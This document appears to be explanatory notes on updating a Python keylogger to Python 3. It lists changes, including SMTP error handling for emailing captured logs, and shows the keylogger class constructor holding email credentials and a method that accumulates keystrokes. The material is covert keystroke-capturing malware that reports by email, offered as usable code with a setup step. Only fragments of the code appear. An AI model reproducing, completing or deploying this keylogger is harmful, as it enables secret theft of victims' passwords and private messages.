Changes Made:
	1.	Python 3 Interpreter Path: Updated the shebang to #!/usr/bin/env python3.
	2.	String Concatenation: Used += for string concatenation in append_to_log.
	3.	str(key.char) to key.char: Directly used key.char instead of converting it with str.
	4.	Exception Handling for Email Sending: Added a try-except block to handle SMTP errors gracefully.
	5.	key == key.space Updated: Changed to key == pynput.keyboard.Key.space for clarity and compatibility.
	6.	Formatted Strings: Used f-strings for better readability.
	7.	Minor Syntax Adjustments: Ensured compatibility with Python 3 syntax.

Make sure you have the required modules installed:
pip install pynput

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

	•	self.log: A string to store logged keypresses.
	•	self.interval: Time interval (in seconds) for sending logs via email.
	•	self.email: Email address used for sending logs.
	•	self.password: Password for the email account.

Purpose: Initialize the Keylogger object with required parameters.


  def append_to_log(self, string):
      self.log += string

	•	Appends each logged keypress (string) to the self.log variable.

Purpose: Accumulate keypresses into a single string for periodic reporting.
